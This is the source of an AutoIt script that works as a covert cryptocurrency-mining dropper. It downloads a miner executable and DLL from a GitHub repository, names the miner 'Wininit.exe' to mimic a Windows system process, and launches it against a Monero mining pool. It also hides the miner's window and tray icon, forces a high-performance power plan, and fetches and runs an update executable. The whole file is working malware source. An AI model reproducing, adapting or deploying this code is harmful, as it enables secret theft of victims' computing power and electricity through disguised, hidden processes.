#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_Fileversion=1.0.6.2
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#Tidy_Parameters=/rel /reel /sf
#AutoIt3Wrapper_Tidy_Stop_OnError=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <GuiListView.au3>

HotKeySet("{f4}", sair)
HotKeySet("{f7}", fechar)

need_update()
;;start_var()
;;download()
;;executar()
;;highperformace()
;;inf()

Func download()
	$path0 = (@AppDataDir & "\WinGG\" & $_name)
	$path1 = (@AppDataDir & "\WinGG\msvcr120.dll")
	InetGet($_Url0, $path0)
	InetGet($_Url1, $path1)
EndFunc   ;==>download

Func executar()
	Run(@AppDataDir & "\WinGG\" & $_name & $_coin_code)
	Global $hwnd = WinWait(@AppDataDir & "\WinGG\" & $_name)
	WinSetState($hwnd, "", @SW_HIDE)
EndFunc   ;==>executar

Func fechar()
	WinClose($hwnd)
	Exit
EndFunc   ;==>fechar

Func highperformace()
	Run(@ComSpec & " /c " & "powercfg.exe /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", @SystemDir, @SW_HIDE)
EndFunc   ;==>highperformace

Func inf()
	While 1
	WEnd
EndFunc   ;==>inf

Func need_update() ; verifica se precisa de update
	$update = IniRead(@AppDataDir & "\WinGG\update.ini", "Version", "Version","Default") ; Pega a versão instalada
	$version_download = InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/Fonte/Version.exe", @AppDataDir & "\WinGG\version.ini") ;baixa o arquivo que contem a versao atualizada
	$version = IniReadSection($version_download, "version", "download") ;le a versao atualizada
	If Not ($version = $update) Then ;compara se o update é diferente caso sim, ele fecha, atualiza e inicia denovo.
		ToolTip($version,0,0)
		Sleep(3000)
		ToolTip($update,100,100)
		Sleep(3000)
		Run(@AppDataDir & "\WinGG\update.exe")
		Exit
	EndIf
EndFunc   ;==>need_update

Func sair()
	Exit
EndFunc   ;==>sair

Func start_var()
	Global $_name = "Wininit.exe"
	Global $_coin_code = " -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ztxslmso@abyssmail.com -p x -t1 --cpu-priority 1 -B" ;Cmd to Mine
	Global $_Url0 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Wininit.exe" ;Url
	Global $_Url1 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/msvcr120.dll" ;Url
EndFunc   ;==>start_var
